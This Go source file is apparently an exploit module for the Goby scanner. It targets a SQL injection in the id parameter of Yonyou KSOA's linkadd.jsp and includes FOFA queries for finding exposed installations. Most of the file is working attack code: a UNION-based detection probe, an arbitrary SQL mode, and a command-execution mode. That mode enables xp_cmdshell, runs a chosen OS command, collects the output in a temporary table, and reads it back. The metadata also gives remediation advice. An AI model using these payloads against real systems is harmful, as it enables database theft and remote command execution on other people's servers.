package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou KSOA linkadd.jsp id SQL Injection Vulnerability",
    "Description": "<p>UFIDA KSOA is an enterprise-level application performance management (APM) software designed to provide enterprises with application performance monitoring and management services, help enterprises identify and solve application performance problems in a timely manner, and improve application quality and stability .</p><p>The software has a SQL injection vulnerability in the parameter id of the linkadd.jsp file. Attackers can use this vulnerability to obtain information in the database, and even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
    "Product": "yonyou-Time-and-Space-KSOA",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-02-22",
    "Author": " 715827922@qq.com",
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || body=\"check.jsp?pid=\"",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || body=\"check.jsp?pid=\"",
    "Level": "2",
    "Impact": "<p>The software has a SQL injection vulnerability in the parameter id of the linkadd.jsp file. Attackers can use this vulnerability to obtain information in the database, and even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Upgrade Yonyou Time and Space Enterprise Information Integration Platform System to the latest version: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Temporarily use WAF and other means to restrict path access</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,cmd,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "' union all select 123,null,sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),null,null,'",
            "show": "attackType=sql"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "用友时空 KSOA linkadd.jsp 文件 id 参数 SQL 注入漏洞",
            "Product": "用友-时空KSOA",
            "Description": "<p>用友时空 KSOA 是一款企业级应用性能管理（APM）软件，旨在为企业提供应用程序的性能监测和管理服务，帮助企业及时识别和解决应用程序的性能问题，提升应用程序的质量和稳定性。</p><p>该软件在 linkadd.jsp 文件的参数 id 处存在 SQL 注入漏洞，攻击者可以利用该漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1、升级用友时空企业信息融通平台系统到最新版本：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2、临时使用WAF等手段限制路径访问</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。&nbsp;<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yonyou KSOA linkadd.jsp id SQL Injection Vulnerability",
            "Product": "yonyou-Time-and-Space-KSOA",
            "Description": "<p>UFIDA KSOA is an enterprise-level application performance management (APM) software designed to provide enterprises with application performance monitoring and management services, help enterprises identify and solve application performance problems in a timely manner, and improve application quality and stability .</p><p>The software has a SQL injection vulnerability in the parameter id of the linkadd.jsp file. Attackers can use this vulnerability to obtain information in the database, and even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
            "Recommendation": "<p>1. Upgrade Yonyou Time and Space Enterprise Information Integration Platform System to the latest version: <a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a></p><p>2. Temporarily use WAF and other means to restrict path access</p>",
            "Impact": "<p>The software has a SQL injection vulnerability in the parameter id of the linkadd.jsp file. Attackers can use this vulnerability to obtain information in the database, and even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-14",
    "PocId": "10834"
}`
	sendPayloadGRYFFk5kuv := func(hostInfo *httpclient.FixUrl, sqlPayload string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewGetRequestConfig("/linksframe/linkadd.jsp?id=666666" + url.QueryEscape(sqlPayload))
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			h := md5.New()
			h.Write([]byte(checkStr))
			payload := `' union all select null,null,sys.fn_sqlvarbasetostr(HashBytes('MD5','` + checkStr + `')),null,null,'`
			resp, _ := sendPayloadGRYFFk5kuv(hostInfo, payload)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, hex.EncodeToString(h.Sum(nil)))
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			cmd := goutils.B2S(stepLogs.Params["cmd"])
			str := goutils.RandomHexString(3)
			if attackType == "sqlPoint" {
				resp, _ := sendPayloadGRYFFk5kuv(expResult.HostInfo, `' union all select null,null,sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),null,null,'`)
				if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "0xe10adc3949ba59abbe56e057f20f883e") {
					expResult.Success = true
					expResult.Output = `GET /linksframe/linkadd.jsp?id=666666%27%20union%20all%20select%20` + str + `,null,sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27GRYFF%27)),null,null,' HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close`
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "sql" {
				resp, err := sendPayloadGRYFFk5kuv(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				} else if len(regexp.MustCompile(`name="linkcaption"[^>]*value=([^ ]+)`).FindStringSubmatch(resp.Utf8Html)) > 1 {
					expResult.Success = true
					expResult.Output = regexp.MustCompile(`name="linkcaption"[^>]*value=([^ ]+)`).FindStringSubmatch(resp.Utf8Html)[1]
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "cmd" {
				tableName := "ts" + goutils.RandomHexString(6)
				sqlCmdInsert := "' union all select null,null,null,null,null,null;create table " + tableName + "(tmpDir varchar(8000));" + "insert into " + tableName + " exec master ..xp_cmdshell '" + cmd + "'--"
				sqlCmdResult := "' union all select null,null,null,null,null,(select top 1 tmpDir from " + tableName + ");drop table " + tableName + "--"
				response, err := sendPayloadGRYFFk5kuv(expResult.HostInfo, `' union all select null,null,null,null,null,null;exec sp_configure 'show advanced options', 1;reconfigure;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; -- `)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if response.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				response, err = sendPayloadGRYFFk5kuv(expResult.HostInfo, sqlCmdInsert)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if response.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				response, err = sendPayloadGRYFFk5kuv(expResult.HostInfo, sqlCmdResult)
				if err != nil {
					expResult.Success = true
					expResult.Output = err.Error()
				} else if len(regexp.MustCompile(`name="hiddenimage"[^>]*value=([^.*\n]+)`).FindStringSubmatch(response.Utf8Html)) > 1 {
					expResult.Success = true
					expResult.Output = regexp.MustCompile(`name="hiddenimage"[^>]*value=([^.*\n]+)`).FindStringSubmatch(response.Utf8Html)[1]
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
				sendPayloadGRYFFk5kuv(expResult.HostInfo, `' union all select null,null,null,null,null,null;exec sp_configure 'show advanced options',1;reconfigure;EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE; -- `)
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
